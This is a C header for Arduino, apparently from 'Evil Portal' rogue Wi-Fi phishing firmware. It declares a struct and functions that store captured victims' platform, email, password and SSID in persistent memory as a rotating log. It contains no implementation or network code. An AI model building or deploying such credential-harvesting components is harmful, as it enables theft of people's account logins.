#ifndef EVIL_PORTAL_LOGS_H
#define EVIL_PORTAL_LOGS_H

#include <Arduino.h>
#include "NVSStore.h"

// ═══════════════════════════════════════════════════════════════════════════
//  EVIL PORTAL LOGS
//  · Almacena credenciales capturadas en NVS (persisten tras reinicios)
//  · Máximo de MAX_LOGS entradas (circular — a mais antiga é sobrescrita)
//  · Cada log: plataforma + email + password + SSID + timestamp (ms uptime)
// ═══════════════════════════════════════════════════════════════════════════

#define MAX_LOGS        20
#define MAX_FIELD_LEN   63    // comprimento máximo por campo (deixa 1 para \0)

struct PortalLog {
    char platform[16];        // "Facebook", "Google", etc.
    char email[MAX_FIELD_LEN + 1];
    char password[MAX_FIELD_LEN + 1];
    char ssid[33];            // SSID ativo quando foi capturado
    uint32_t timestampSec;    // segundos desde o boot quando foi capturado
    uint32_t bootNum;         // boot # em que foi capturado
};

// ═══════════════════════════════════════════════════════════════════════════
//  API
// ═══════════════════════════════════════════════════════════════════════════

// Salva um novo log (rotacionando se já houver MAX_LOGS)
bool portalLogAdd(const String& platform, const String& email,
                  const String& password, const String& ssid);

// Obtém o número de logs salvos
int  portalLogCount();

// Obtém o log por índice (0 = mais recente)
bool portalLogGet(int idx, PortalLog& out);

// Apaga todos os logs
void portalLogClear();

#endif